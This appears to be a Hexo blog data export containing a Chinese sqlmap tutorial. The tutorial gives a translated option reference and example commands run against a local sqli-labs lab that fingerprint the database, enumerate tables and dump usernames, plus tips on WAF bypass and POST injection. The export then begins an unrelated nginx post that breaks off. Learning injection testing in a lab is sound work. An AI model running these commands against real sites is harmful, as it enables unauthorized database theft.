hostname</br\n\t检索服务器的主机名</br>\n--is-dba            Detect if the DBMS current user is DBA</br>\n\t检测是不是dba，就是root权限咯</br>\n--users             Enumerate DBMS users</br>\n\t枚举数据库用户</br>\n--passwords         Enumerate DBMS users password hashes</br>\n\t枚举数据库用户的哈希值</br>\n--privileges        Enumerate DBMS users privileges</br>\n\t枚举数据库用户的权限</br>\n--roles             Enumerate DBMS users roles</br>\n\t枚举数据库用户的角色</br>\n--dbs               Enumerate DBMS databases</br>\n\t枚举数据库有哪些</br>\n--tables            Enumerate DBMS database tables</br>\n\t枚举数据表名</br>\n--columns           Enumerate DBMS database table columns</br>\n\t枚举列名</br>\n--schema            Enumerate DBMS schema</br>\n\t这个测试过，将所有的数据库的表的基本信息都枚举了，有哪些列，列的数据类型，具体数据就没有枚举</br>\n--count             Retrieve number of entries for table(s)</br>\n\t枚举表格个数</br>\n--dump              Dump DBMS database table entries</br>\n\t输出数据库表的数据</br>\n--dump-all          Dump all DBMS databases tables entries</br>\n\t输出所有</br>\n--search            Search column(s), table(s) and/or database name(s)</br>\n\t查找特定的列名，表名或数据库名，配合下面的-D,-C,-T</br>\n--comments          Retrieve DBMS comments</br>\n\t枚举数据库的注释</br>\n-D DB               DBMS database to enumerate</br>\n\t指定数据库名</br>\n-T TBL              DBMS database table(s) to enumerate</br>\n\t指定表名</br>\n-C COL              DBMS database table column(s) to enumerate</br>\n\t指定列名</br>\n-X EXCLUDECOL       DBMS database table column(s) to not enumerate</br>\n\t指定不枚举那个列</br>\n-U USER             DBMS user to enumerate</br>\n\t枚举用户，但单独用这个参数感觉没什么用啊，这个可能要看源码才能解决了，估计要配合其他参数</br>\n--exclude-sysdbs    Exclude DBMS system databases when enumerating tables</br>\n\t枚举时排除系统的数据库</br>\n--pivot-column=P..  Pivot column name</br>\n\t以某一列为核心？这个用过没感觉出什么用</br>\n--where=DUMPWHERE   Use WHERE condition while table dumping</br>\n\t使用where调试限制table的输出</br>\n--start=LIMITSTART  First query output entry to retrieve</br>\n\t指定开始从第几行开始输出，如--start=3，前两行就不输出了</br>\n--stop=LIMITSTOP    Last query output entry to retrieve</br>\n\t指定从第几行开始停止输出</br>\n--first=FIRSTCHAR   First query output word character to retrieve</br>\n\t指定只输出第几个字符开始输出，盲注才有效，亲测</br>\n--last=LASTCHAR     Last query output word character to retrieve</br>\n\t指定只输出第几个字符停止输出，盲注才有效，亲测，跟上面的配合指定范围，</br>\n\t如 ：--first 3 --last 5  只输出3到5位置的字符</br>\n--sql-query=QUERY   SQL statement to be executed</br>\n\t指定执行我们的sql语句</br>\n--sql-shell         Prompt for an interactive SQL shell</br>\n\t返回一个sql的shell</br>\n--sql-file=SQLFILE  Execute SQL statements from given file(s)</br>\n\t从文件中读取执行sql语句</br>\n\n## 二.实例\n\t1.sqlmap -u \"http://127.0.0.1:80/sqli-labs/Less-1/?id=1\" -b --is-dba --dbs\n\t查看指纹信息/是否dba(root权限)/数据库\n\tweb server operating system: Linux Ubuntu\n\tweb application technology: Apache 2.4.18\n\tback-end DBMS operating system: Linux Ubuntu\n\tback-end DBMS: MySQL 5.0\n\tbanner:    '5.7.23-0ubuntu0.16.04.1'\n\n\tcurrent user is DBA:    True\n\n\tavailable databases [6]:\n\t[*] challenges\n\t[*] information_schema\n\t[*] mysql\n\t[*] performance_schema\n\t[*] security\n\t[*] sys\n\n\t2.查看security下表名\n\t sqlmap -u \"http://127.0.0.1:80/sqli-labs/Less-1/?id=1\" -D security --tables\n\tDatabase: security\n\t[4 tables]\n\t+----------+\n\t| emails   |\n\t| referers |\n\t| uagents  |\n\t| users    |\n\t+----------+\n\n\t3.查看列名\n\tsqlmap -u \"http://127.0.0.1:80/sqli-labs/Less-1/?id=1\" -D security -T users --columns\n\n\tDatabase: security\n\tTable: users\n\t[3 columns]\n\t+----------+-------------+\n\t| Column   | Type        |\n\t+----------+-------------+\n\t| id       | int(3)      |\n\t| password | varchar(20) |\n\t| username | varchar(20) |\n\t+----------+-------------+\n\n\t4.获得所有username\n\tsqlmap -u \"http://127.0.0.1:80/sqli-labs/Less-1/?id=1\" -D security -T users -C username --dump\n\n\tDatabase: security\n\tTable: users\n\t[16 entries]\n\t+-----------+\n\t| username  |\n\t+-----------+\n\t| admin     |\n\t| admin#    |\n\t| admin'#   |\n\t| admin1    |\n\t| admin2    |\n\t| admin3    |\n\t| admin4    |\n\t| admin\\\\'# |\n\t| Angelina  |\n\t| batman    |\n\t| dhakkan   |\n\t| Dumb      |\n\t| Dummy     |\n\t| secure    |\n\t| stupid    |\n\t| superman  |\n\t+-----------+\n\n### 三.技巧等\n\t1.自动寻找注入点\n\tsqlmap -u \"http://127.0.0.1:80/sqli-labs/Less-62/?id=1*\" --batch\n\t如上，在可能的注入点后，加上*，将会自动寻找注入\n\t可以加上 --level n（1-5） 参数，越高越全面\n\n\t2.绕过WAF\n\t--tamper=TAMPER 使用给定的脚本（S）篡改注入数据\n\n\t3.post注入\n\t--data \"id=1\"\n\t或 抓取post数据包，保存为txt, -r参数读取文件 -p 要注入的参数\n","slug":"security/sql/sqlmap","published":1,"updated":"2019-10-13T12:15:12.180Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321m2005h6dcp3bjsagoh","content":"<p>使用sqlmap需要自己先找到注入点</p>\n<h2 id=\"1-sqlmap-用户文档\"><a href=\"#1-sqlmap-用户文档\" class=\"headerlink\" title=\"1.sqlmap 用户文档\"></a>1.sqlmap 用户文档</h2><p>用户文档来自 <a href=\"https://blog.csdn.net/u012763794/article/details/52638931\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/u012763794/article/details/52638931</a><br><br>-v VERBOSE 输出信息的详细程度</p>\n<pre><code># Verbosity level.\n# Valid: integer between 0 and 6\n# 0: Show only error and critical messages  只显示错误和关键信息\n# 1: Show also warning and info messages    警告和信息\n# 2: Show also debug messages               调试信息\n# 3: Show also payloads injected            payload，如：[15:32:10] [PAYLOAD] 1)&apos;,(..)&quot;(&quot;\n# 4: Show also HTTP requests                整个GET报文都看到了\n# 5: Show also HTTP responses&apos; headers         返回报文的头部\n# 6: Show also HTTP responses&apos; page content    返回的html代码都有了\n# Default: 1\n</code></pre><p> Request: 请求<br>    These options can be used to specify how to connect to the target URL</p>\n<pre><code>--method=METHOD     Force usage of given HTTP method (e.g. PUT)\n    指定HTTP请求的方法，GET，POST，PUT，MOVE等\n--data=DATA         Data string to be sent through POST\n    指定POST的参数\n--param-del=PARA..  Character used for splitting parameter values\n    这个拆分一些参数的，如下面用;拆分post参数\n    python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;query=foobar;id=1&quot; --param-del=&quot;;&quot; -f --banner --dbs --users\n--cookie=COOKIE     HTTP Cookie header value\n    指定cookie值\n--cookie-del=COO..  Character used for splitting cookie values\n    指定分割cookie值的字符是什么\n--load-cookies=L..  File containing cookies in Netscape/wget format\n    这个是从文件中读取cookie吧，Netscape/wget格式的\n--drop-set-cookie   Ignore Set-Cookie header from response\n    忽略响应包的Set-Cookie头\n--user-agent=AGENT  HTTP User-Agent header value\n    指定User-Agent用户代理\n--random-agent      Use randomly selected HTTP User-Agent header value\n    随机选用sqlmap目录中的User-Agent，这个文件再txt目录\n--host=HOST         HTTP Host header value\n    指定主机头\n--referer=REFERER   HTTP Referer header value\n    指定Referer头，就是请求来源的意思\n-H HEADER, --hea..  Extra header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;)\n    指定某个头部，如： -H &quot;X-Forwarded-For: 127.0.0.1&quot;\n--headers=HEADERS   Extra headers (e.g. &quot;Accept-Language: fr\\nETag: 123&quot;)\n    这个的话应该是可以指定多个，用\\n分割\n--auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)\n    指定http认证类型\n--auth-cred=AUTH..  HTTP authentication credentials (name:password)\n    指定http认证的账户名和密码，就行apache就可以设置访问某个目录时要认证\n--auth-file=AUTH..  HTTP authentication PEM cert/private key file\n    指定一个私钥文件来认证\n--ignore-401        Ignore HTTP Error 401 (Unauthorized)\n    忽略401错误\n--proxy=PROXY       Use a proxy to connect to the target URL\n    指定代理\n--proxy-cred=PRO..  Proxy authentication credentials (name:password)\n    指定代理的认证信息，就是账号密码\n--proxy-file=PRO..  Load proxy list from a file\n    从文件中选择代理\n--ignore-proxy      Ignore system default proxy settings\n    忽略系统默认代理\n--tor               Use Tor anonymity network\n    使用tor网络\n--tor-port=TORPORT  Set Tor proxy port other than default\n    设置tor的端口，如果不是默认端口的话\n--tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))\n    设置tor代理的类型\n--check-tor         Check to see if Tor is used properly\n    检测tor能不能用\n--delay=DELAY       Delay in seconds between each HTTP request\n    设置每个HTTP请求的时间间隔，这个在有些限制单位时间请求数的防火墙的时候可以用得到，我上次就用过\n--timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)\n    设置超时时间，默认30秒\n--retries=RETRIES   Retries when the connection timeouts (default 3)\n    设置重试的次数，默认3次\n--randomize=RPARAM  Randomly change value for given parameter(s)\n    随机地更改给定参数的值\n--safe-url=SAFEURL  URL address to visit frequently during testing\n    有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求\n    这里提供一个安全不错误的连接，每隔一段时间都会去访问一下\n--safe-post=SAFE..  POST data to send to a safe URL\n    这里设置一个正确的post数据\n--safe-req=SAFER..  Load safe HTTP request from a file\n    从文件中读取安全，或者叫正确的http请求\n--safe-freq=SAFE..  Test requests between two visits to a given safe URL\n    设置访问安全url的时间间隔\n--skip-urlencode    Skip URL encoding of payload data\n    不进行url编码\n--csrf-token=CSR..  Parameter used to hold anti-CSRF token\n    设置CSRF的token\n--csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token\n\n--force-ssl         Force usage of SSL/HTTPS\n    强制使用https\n--hpp               Use HTTP parameter pollution method\n    尝试了一下，只能用于ASP，得到报错信息如下：\n    [WARNING] HTTP parameter pollution should work only against ASP(.NET) targets\n\n--eval=EVALCODE     Evaluate provided Python code before the request (e.g.\n                    &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;)\n    发送请求之前，先运行这段python代码，比如对某个参数进行处理\n    比如下面的，hash参数就是id的md5值\n    python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc\n509a6f75849b&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;\n</code></pre><p>Fingerprint:<br><br>-f, –fingerprint   Perform an extensive DBMS version fingerprint<br>    这个应该是数据库指纹识别，加了可能识别更好<br></p>\n<p>Enumeration:<br><br>These options can be used to enumerate the back-end database<br>management system information, structure and data contained in the<br>tables. Moreover you can run your own SQL statements<br><br>-a, –all           Retrieve everything<br><br>    检索所有，这是拖库的节奏啊<br><br>-b, –banner        Retrieve DBMS banner<br><br>    检索数据库的一些标志性的信息，就是指纹这样子吧<br><br>–current-user      Retrieve DBMS current user<br><br>    检索当前连接数据库的用户<br><br>–current-db        Retrieve DBMS current database<br><br>    检索当前连接的数据库<br><br>–hostname          Retrieve DBMS server hostname&lt;/br<br>    检索服务器的主机名<br><br>–is-dba            Detect if the DBMS current user is DBA<br><br>    检测是不是dba，就是root权限咯<br><br>–users             Enumerate DBMS users<br><br>    枚举数据库用户<br><br>–passwords         Enumerate DBMS users password hashes<br><br>    枚举数据库用户的哈希值<br><br>–privileges        Enumerate DBMS users privileges<br><br>    枚举数据库用户的权限<br><br>–roles             Enumerate DBMS users roles<br><br>    枚举数据库用户的角色<br><br>–dbs               Enumerate DBMS databases<br><br>    枚举数据库有哪些<br><br>–tables            Enumerate DBMS database tables<br><br>    枚举数据表名<br><br>–columns           Enumerate DBMS database table columns<br><br>    枚举列名<br><br>–schema            Enumerate DBMS schema<br><br>    这个测试过，将所有的数据库的表的基本信息都枚举了，有哪些列，列的数据类型，具体数据就没有枚举<br><br>–count             Retrieve number of entries for table(s)<br><br>    枚举表格个数<br><br>–dump              Dump DBMS database table entries<br><br>    输出数据库表的数据<br><br>–dump-all          Dump all DBMS databases tables entries<br><br>    输出所有<br><br>–search            Search column(s), table(s) and/or database name(s)<br><br>    查找特定的列名，表名或数据库名，配合下面的-D,-C,-T<br><br>–comments          Retrieve DBMS comments<br><br>    枚举数据库的注释<br><br>-D DB               DBMS database to enumerate<br><br>    指定数据库名<br><br>-T TBL              DBMS database table(s) to enumerate<br><br>    指定表名<br><br>-C COL              DBMS database table column(s) to enumerate<br><br>    指定列名<br><br>-X EXCLUDECOL       DBMS database table column(s) to not enumerate<br><br>    指定不枚举那个列<br><br>-U USER             DBMS user to enumerate<br><br>    枚举用户，但单独用这个参数感觉没什么用啊，这个可能要看源码才能解决了，估计要配合其他参数<br><br>–exclude-sysdbs    Exclude DBMS system databases when enumerating tables<br><br>    枚举时排除系统的数据库<br><br>–pivot-column=P..  Pivot column name<br><br>    以某一列为核心？这个用过没感觉出什么用<br><br>–where=DUMPWHERE   Use WHERE condition while table dumping<br><br>    使用where调试限制table的输出<br><br>–start=LIMITSTART  First query output entry to retrieve<br><br>    指定开始从第几行开始输出，如–start=3，前两行就不输出了<br><br>–stop=LIMITSTOP    Last query output entry to retrieve<br><br>    指定从第几行开始停止输出<br><br>–first=FIRSTCHAR   First query output word character to retrieve<br><br>    指定只输出第几个字符开始输出，盲注才有效，亲测<br><br>–last=LASTCHAR     Last query output word character to retrieve<br><br>    指定只输出第几个字符停止输出，盲注才有效，亲测，跟上面的配合指定范围，<br><br>    如 ：–first 3 –last 5  只输出3到5位置的字符<br><br>–sql-query=QUERY   SQL statement to be executed<br><br>    指定执行我们的sql语句<br><br>–sql-shell         Prompt for an interactive SQL shell<br><br>    返回一个sql的shell<br><br>–sql-file=SQLFILE  Execute SQL statements from given file(s)<br><br>    从文件中读取执行sql语句<br></p>\n<h2 id=\"二-实例\"><a href=\"#二-实例\" class=\"headerlink\" title=\"二.实例\"></a>二.实例</h2><pre><code>1.sqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot; -b --is-dba --dbs\n查看指纹信息/是否dba(root权限)/数据库\nweb server operating system: Linux Ubuntu\nweb application technology: Apache 2.4.18\nback-end DBMS operating system: Linux Ubuntu\nback-end DBMS: MySQL 5.0\nbanner:    &apos;5.7.23-0ubuntu0.16.04.1&apos;\n\ncurrent user is DBA:    True\n\navailable databases [6]:\n[*] challenges\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] security\n[*] sys\n\n2.查看security下表名\n sqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot; -D security --tables\nDatabase: security\n[4 tables]\n+----------+\n| emails   |\n| referers |\n| uagents  |\n| users    |\n+----------+\n\n3.查看列名\nsqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot; -D security -T users --columns\n\nDatabase: security\nTable: users\n[3 columns]\n+----------+-------------+\n| Column   | Type        |\n+----------+-------------+\n| id       | int(3)      |\n| password | varchar(20) |\n| username | varchar(20) |\n+----------+-------------+\n\n4.获得所有username\nsqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot; -D security -T users -C username --dump\n\nDatabase: security\nTable: users\n[16 entries]\n+-----------+\n| username  |\n+-----------+\n| admin     |\n| admin#    |\n| admin&apos;#   |\n| admin1    |\n| admin2    |\n| admin3    |\n| admin4    |\n| admin\\\\&apos;# |\n| Angelina  |\n| batman    |\n| dhakkan   |\n| Dumb      |\n| Dummy     |\n| secure    |\n| stupid    |\n| superman  |\n+-----------+\n</code></pre><h3 id=\"三-技巧等\"><a href=\"#三-技巧等\" class=\"headerlink\" title=\"三.技巧等\"></a>三.技巧等</h3><pre><code>1.自动寻找注入点\nsqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-62/?id=1*&quot; --batch\n如上，在可能的注入点后，加上*，将会自动寻找注入\n可以加上 --level n（1-5） 参数，越高越全面\n\n2.绕过WAF\n--tamper=TAMPER 使用给定的脚本（S）篡改注入数据\n\n3.post注入\n--data &quot;id=1&quot;\n或 抓取post数据包，保存为txt, -r参数读取文件 -p 要注入的参数\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p>使用sqlmap需要自己先找到注入点</p>\n<h2 id=\"1-sqlmap-用户文档\"><a href=\"#1-sqlmap-用户文档\" class=\"headerlink\" title=\"1.sqlmap 用户文档\"></a>1.sqlmap 用户文档</h2><p>用户文档来自 <a href=\"https://blog.csdn.net/u012763794/article/details/52638931\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/u012763794/article/details/52638931</a><br><br>-v VERBOSE 输出信息的详细程度</p>\n<pre><code># Verbosity level.\n# Valid: integer between 0 and 6\n# 0: Show only error and critical messages  只显示错误和关键信息\n# 1: Show also warning and info messages    警告和信息\n# 2: Show also debug messages               调试信息\n# 3: Show also payloads injected            payload，如：[15:32:10] [PAYLOAD] 1)&apos;,(..)&quot;(&quot;\n# 4: Show also HTTP requests                整个GET报文都看到了\n# 5: Show also HTTP responses&apos; headers         返回报文的头部\n# 6: Show also HTTP responses&apos; page content    返回的html代码都有了\n# Default: 1\n</code></pre><p> Request: 请求<br>    These options can be used to specify how to connect to the target URL</p>\n<pre><code>--method=METHOD     Force usage of given HTTP method (e.g. PUT)\n    指定HTTP请求的方法，GET，POST，PUT，MOVE等\n--data=DATA         Data string to be sent through POST\n    指定POST的参数\n--param-del=PARA..  Character used for splitting parameter values\n    这个拆分一些参数的，如下面用;拆分post参数\n    python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;query=foobar;id=1&quot; --param-del=&quot;;&quot; -f --banner --dbs --users\n--cookie=COOKIE     HTTP Cookie header value\n    指定cookie值\n--cookie-del=COO..  Character used for splitting cookie values\n    指定分割cookie值的字符是什么\n--load-cookies=L..  File containing cookies in Netscape/wget format\n    这个是从文件中读取cookie吧，Netscape/wget格式的\n--drop-set-cookie   Ignore Set-Cookie header from response\n    忽略响应包的Set-Cookie头\n--user-agent=AGENT  HTTP User-Agent header value\n    指定User-Agent用户代理\n--random-agent      Use randomly selected HTTP User-Agent header value\n    随机选用sqlmap目录中的User-Agent，这个文件再txt目录\n--host=HOST         HTTP Host header value\n    指定主机头\n--referer=REFERER   HTTP Referer header value\n    指定Referer头，就是请求来源的意思\n-H HEADER, --hea..  Extra header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;)\n    指定某个头部，如： -H &quot;X-Forwarded-For: 127.0.0.1&quot;\n--headers=HEADERS   Extra headers (e.g. &quot;Accept-Language: fr\\nETag: 123&quot;)\n    这个的话应该是可以指定多个，用\\n分割\n--auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)\n    指定http认证类型\n--auth-cred=AUTH..  HTTP authentication credentials (name:password)\n    指定http认证的账户名和密码，就行apache就可以设置访问某个目录时要认证\n--auth-file=AUTH..  HTTP authentication PEM cert/private key file\n    指定一个私钥文件来认证\n--ignore-401        Ignore HTTP Error 401 (Unauthorized)\n    忽略401错误\n--proxy=PROXY       Use a proxy to connect to the target URL\n    指定代理\n--proxy-cred=PRO..  Proxy authentication credentials (name:password)\n    指定代理的认证信息，就是账号密码\n--proxy-file=PRO..  Load proxy list from a file\n    从文件中选择代理\n--ignore-proxy      Ignore system default proxy settings\n    忽略系统默认代理\n--tor               Use Tor anonymity network\n    使用tor网络\n--tor-port=TORPORT  Set Tor proxy port other than default\n    设置tor的端口，如果不是默认端口的话\n--tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))\n    设置tor代理的类型\n--check-tor         Check to see if Tor is used properly\n    检测tor能不能用\n--delay=DELAY       Delay in seconds between each HTTP request\n    设置每个HTTP请求的时间间隔，这个在有些限制单位时间请求数的防火墙的时候可以用得到，我上次就用过\n--timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)\n    设置超时时间，默认30秒\n--retries=RETRIES   Retries when the connection timeouts (default 3)\n    设置重试的次数，默认3次\n--randomize=RPARAM  Randomly change value for given parameter(s)\n    随机地更改给定参数的值\n--safe-url=SAFEURL  URL address to visit frequently during testing\n    有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求\n    这里提供一个安全不错误的连接，每隔一段时间都会去访问一下\n--safe-post=SAFE..  POST data to send to a safe URL\n    这里设置一个正确的post数据\n--safe-req=SAFER..  Load safe HTTP request from a file\n    从文件中读取安全，或者叫正确的http请求\n--safe-freq=SAFE..  Test requests between two visits to a given safe URL\n    设置访问安全url的时间间隔\n--skip-urlencode    Skip URL encoding of payload data\n    不进行url编码\n--csrf-token=CSR..  Parameter used to hold anti-CSRF token\n    设置CSRF的token\n--csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token\n\n--force-ssl         Force usage of SSL/HTTPS\n    强制使用https\n--hpp               Use HTTP parameter pollution method\n    尝试了一下，只能用于ASP，得到报错信息如下：\n    [WARNING] HTTP parameter pollution should work only against ASP(.NET) targets\n\n--eval=EVALCODE     Evaluate provided Python code before the request (e.g.\n                    &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;)\n    发送请求之前，先运行这段python代码，比如对某个参数进行处理\n    比如下面的，hash参数就是id的md5值\n    python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc\n509a6f75849b&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;\n</code></pre><p>Fingerprint:<br><br>-f, –fingerprint   Perform an extensive DBMS version fingerprint<br>    这个应该是数据库指纹识别，加了可能识别更好<br></p>\n<p>Enumeration:<br><br>These options can be used to enumerate the back-end database<br>management system information, structure and data contained in the<br>tables. Moreover you can run your own SQL statements<br><br>-a, –all           Retrieve everything<br><br>    检索所有，这是拖库的节奏啊<br><br>-b, –banner        Retrieve DBMS banner<br><br>    检索数据库的一些标志性的信息，就是指纹这样子吧<br><br>–current-user      Retrieve DBMS current user<br><br>    检索当前连接数据库的用户<br><br>–current-db        Retrieve DBMS current database<br><br>    检索当前连接的数据库<br><br>–hostname          Retrieve DBMS server hostname&lt;/br<br>    检索服务器的主机名<br><br>–is-dba            Detect if the DBMS current user is DBA<br><br>    检测是不是dba，就是root权限咯<br><br>–users             Enumerate DBMS users<br><br>    枚举数据库用户<br><br>–passwords         Enumerate DBMS users password hashes<br><br>    枚举数据库用户的哈希值<br><br>–privileges        Enumerate DBMS users privileges<br><br>    枚举数据库用户的权限<br><br>–roles             Enumerate DBMS users roles<br><br>    枚举数据库用户的角色<br><br>–dbs               Enumerate DBMS databases<br><br>    枚举数据库有哪些<br><br>–tables            Enumerate DBMS database tables<br><br>    枚举数据表名<br><br>–columns           Enumerate DBMS database table columns<br><br>    枚举列名<br><br>–schema            Enumerate DBMS schema<br><br>    这个测试过，将所有的数据库的表的基本信息都枚举了，有哪些列，列的数据类型，具体数据就没有枚举<br><br>–count             Retrieve number of entries for table(s)<br><br>    枚举表格个数<br><br>–dump              Dump DBMS database table entries<br><br>    输出数据库表的数据<br><br>–dump-all          Dump all DBMS databases tables entries<br><br>    输出所有<br><br>–search            Search column(s), table(s) and/or database name(s)<br><br>    查找特定的列名，表名或数据库名，配合下面的-D,-C,-T<br><br>–comments          Retrieve DBMS comments<br><br>    枚举数据库的注释<br><br>-D DB               DBMS database to enumerate<br><br>    指定数据库名<br><br>-T TBL              DBMS database table(s) to enumerate<br><br>    指定表名<br><br>-C COL              DBMS database table column(s) to enumerate<br><br>    指定列名<br><br>-X EXCLUDECOL       DBMS database table column(s) to not enumerate<br><br>    指定不枚举那个列<br><br>-U USER             DBMS user to enumerate<br><br>    枚举用户，但单独用这个参数感觉没什么用啊，这个可能要看源码才能解决了，估计要配合其他参数<br><br>–exclude-sysdbs    Exclude DBMS system databases when enumerating tables<br><br>    枚举时排除系统的数据库<br><br>–pivot-column=P..  Pivot column name<br><br>    以某一列为核心？这个用过没感觉出什么用<br><br>–where=DUMPWHERE   Use WHERE condition while table dumping<br><br>    使用where调试限制table的输出<br><br>–start=LIMITSTART  First query output entry to retrieve<br><br>    指定开始从第几行开始输出，如–start=3，前两行就不输出了<br><br>–stop=LIMITSTOP    Last query output entry to retrieve<br><br>    指定从第几行开始停止输出<br><br>–first=FIRSTCHAR   First query output word character to retrieve<br><br>    指定只输出第几个字符开始输出，盲注才有效，亲测<br><br>–last=LASTCHAR     Last query output word character to retrieve<br><br>    指定只输出第几个字符停止输出，盲注才有效，亲测，跟上面的配合指定范围，<br><br>    如 ：–first 3 –last 5  只输出3到5位置的字符<br><br>–sql-query=QUERY   SQL statement to be executed<br><br>    指定执行我们的sql语句<br><br>–sql-shell         Prompt for an interactive SQL shell<br><br>    返回一个sql的shell<br><br>–sql-file=SQLFILE  Execute SQL statements from given file(s)<br><br>    从文件中读取执行sql语句<br></p>\n<h2 id=\"二-实例\"><a href=\"#二-实例\" class=\"headerlink\" title=\"二.实例\"></a>二.实例</h2><pre><code>1.sqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot; -b --is-dba --dbs\n查看指纹信息/是否dba(root权限)/数据库\nweb server operating system: Linux Ubuntu\nweb application technology: Apache 2.4.18\nback-end DBMS operating system: Linux Ubuntu\nback-end DBMS: MySQL 5.0\nbanner:    &apos;5.7.23-0ubuntu0.16.04.1&apos;\n\ncurrent user is DBA:    True\n\navailable databases [6]:\n[*] challenges\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] security\n[*] sys\n\n2.查看security下表名\n sqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot; -D security --tables\nDatabase: security\n[4 tables]\n+----------+\n| emails   |\n| referers |\n| uagents  |\n| users    |\n+----------+\n\n3.查看列名\nsqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot; -D security -T users --columns\n\nDatabase: security\nTable: users\n[3 columns]\n+----------+-------------+\n| Column   | Type        |\n+----------+-------------+\n| id       | int(3)      |\n| password | varchar(20) |\n| username | varchar(20) |\n+----------+-------------+\n\n4.获得所有username\nsqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot; -D security -T users -C username --dump\n\nDatabase: security\nTable: users\n[16 entries]\n+-----------+\n| username  |\n+-----------+\n| admin     |\n| admin#    |\n| admin&apos;#   |\n| admin1    |\n| admin2    |\n| admin3    |\n| admin4    |\n| admin\\\\&apos;# |\n| Angelina  |\n| batman    |\n| dhakkan   |\n| Dumb      |\n| Dummy     |\n| secure    |\n| stupid    |\n| superman  |\n+-----------+\n</code></pre><h3 id=\"三-技巧等\"><a href=\"#三-技巧等\" class=\"headerlink\" title=\"三.技巧等\"></a>三.技巧等</h3><pre><code>1.自动寻找注入点\nsqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-62/?id=1*&quot; --batch\n如上，在可能的注入点后，加上*，将会自动寻找注入\n可以加上 --level n（1-5） 参数，越高越全面\n\n2.绕过WAF\n--tamper=TAMPER 使用给定的脚本（S）篡改注入数据\n\n3.post注入\n--data &quot;id=1&quot;\n或 抓取post数据包，保存为txt, -r参数读取文件 -p 要注入的参数\n</code></pre>"},{"title":"nginx 基本信息","date":"2018-09-17T15:45:32.000Z","_content":"\n#### 1.nginx大概作用\n\n原文链接: https://juejin.im/entry/58afa0975c497d006778502b<br/>\n###### 1.反向代理\n反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。简单来说就是真实的服务器不能直接被外部网络访问，所以需要一台代理服务器，而代理服务器能被外部网络访问的同时又跟真实服务器在同一个网络环境，当然也可能是同一台服务器，端口不同而已。<br>\n\n###### 2.负载均衡\n\nRR（默认）<br>\n每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除<br>\n\n权重<br>\n指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。<br>\n\nip_hash<br>\n上面的2种方式都有一个问题，那就是下一个请求来的时候请求可能分发到另外一个服务器，当我们的程序不是无状态的时候（采用了session保存数据），这时候就有一个很大的很问题了，比如把登录信息保存到了session中，那么跳转到另外一台服务器的时候就需要重新登录了，所以很多时候我们需要一个客户只访问一个服务器，那么就需要用iphash了，iphash的每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题<br>\n\n###### 3.http服务器\nNginx本身也是一个静态资源的服务器，当只有静态资源的时候，就可以使用Nginx来做服务器，同时现在也很流行动静分离，就可以通过Nginx来实现<br>\n动静分离<br>\n动静分离是让动态网站里的动态网页根据一定规则把不变的资源和经常变的资源区分开来，动静资源做好了拆分以后，我们就可以根据静态资源的特点将其做缓存操作，这就是网站静态化处理的核心思路<br>\n###### 4.正向代理\n正向代理，意思是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端才能使用正向代理。当你需要把你的服务器作为代理服务器的时候，可以用Nginx来实现正向代理。<br>\n\n问题： 正向反向的区别是部署在客户端还是服务端？？？？<br>\n\n2019/7/18添加: <br>\n现在，我理解的正向代理与反向代理的区别是:正向代理是将请求代理出去，反代理是将请求代理进来<br>\n\n- 正向\n\n通常用来访问无法访问的资源,如google。<br>\n例如 vpn 。client 访问代理(vpn),代理去 <strong> 帮你访问 </strong>client想要的资源，然后返回回来. 其中，有个特点，正向代理需要提前设置一些东西，例如vpn的配置信息.\n\n- 反向\n\n通常用来负载均衡，和保证内网安全.<br>\n客户端是 <strong>无感知 